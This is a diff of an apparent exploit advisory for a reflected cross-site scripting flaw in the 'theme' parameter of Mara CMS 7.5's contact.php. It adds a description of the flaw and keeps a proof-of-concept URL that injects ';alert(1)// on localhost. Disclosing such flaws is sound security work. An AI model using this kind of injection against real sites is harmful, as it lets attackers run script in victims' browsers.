@@ -2,9 +2,12 @@
 | # Title     : Mara CMS 7.5 Cross Site Scriping                                                                           |
 | # Author    : George Tsimpidas                                                                                           |                                                                                              
 | # Tested on : Kali Linux (X64)                                                                                           |                                                                                     |
-| # Vendor    : https://sourceforge.net/projects/maracms/                                                                  |  
-| # Dork      : n/a                                                                                                        |
+| # Vendor    : https://sourceforge.net/projects/maracms/                                                                  |                                                                                                         |
 ============================================================================================================================
+
+Description : 
+
+The parameter contact.php?theme= is not sanitized properly, therefore is prone to Reflected XSS
 
 PoC
 
@@ -13,6 +16,6 @@ PoC
 
 Path : http://localhost/contact.php?theme=< inject payload here>
 
-Full Poc : 
+Full Path : 
 
 http://localhost/contact.php?theme=seven69387';alert(1)//154
